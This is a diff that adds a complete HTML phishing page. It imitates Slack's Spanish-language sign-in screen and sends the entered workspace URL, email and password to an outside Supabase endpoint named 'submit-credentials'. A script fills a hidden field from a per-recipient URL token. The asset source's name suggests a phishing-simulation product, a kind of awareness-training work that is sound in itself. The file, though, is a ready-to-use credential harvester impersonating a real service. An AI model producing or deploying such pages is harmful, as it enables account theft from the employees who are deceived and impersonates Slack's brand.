@@ -1,0 +1,39 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8">
+<title>Slack - Iniciar sesión</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:#f4ede4;font-family:'Slack-Lato','Lato',Arial,sans-serif;color:#1d1c1d;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .box{background:#fff;width:100%;max-width:460px;padding:40px;border-radius:8px;box-shadow:0 1px 6px rgba(0,0,0,0.08)}
+  .logo{height:36px;margin-bottom:20px;display:block}
+  h1{font-weight:900;font-size:30px;margin:0 0 8px}
+  .sub{font-size:15px;color:#454245;margin:0 0 28px}
+  label{display:block;font-size:13px;font-weight:700;margin:0 0 6px}
+  input{width:100%;padding:12px 14px;font-size:15px;border:1px solid #ddd;border-radius:6px;outline:none;font-family:inherit;margin-bottom:16px;background:#fff}
+  input:focus{border-color:#611F69;box-shadow:0 0 0 4px rgba(97,31,105,0.15)}
+  button{display:block;width:100%;background:#611F69;color:#fff;border:none;padding:14px;font-size:16px;font-weight:700;border-radius:6px;cursor:pointer;font-family:inherit;margin-top:10px}
+  button:hover{background:#4a1751}
+  .hint{font-size:13px;color:#454245;margin-top:18px;text-align:center}
+  a{color:#1264A3;text-decoration:none}
+  a:hover{text-decoration:underline}
+</style></head>
+<body>
+<div class="box">
+  <img class="logo" src="https://cdn.jsdelivr.net/gh/mikel-santisteban/deceptics-email-assets@main/slack.png" alt="Slack">
+  <h1>Inicia sesión en Slack</h1>
+  <p class="sub">Te recomendamos usar la URL de tu workspace y tu cuenta corporativa.</p>
+  <form action="https://amjshbgyuazrtxrokqwy.supabase.co/functions/v1/submit-credentials" method="POST">
+    <input type="hidden" name="token" id="token-field">
+    <label>URL del workspace</label>
+    <input type="text" name="workspace_url" placeholder="tu-empresa.slack.com" required autofocus>
+    <label>Email</label>
+    <input type="email" name="email" required>
+    <label>Contraseña</label>
+    <input type="password" name="password" required>
+    <button type="submit">Iniciar sesión</button>
+  </form>
+  <p class="hint"><a href="#">¿Has olvidado tu contraseña?</a></p>
+</div>
+<script>document.getElementById('token-field').value=new URLSearchParams(location.search).get('t')||'';</script>
+</body></html>
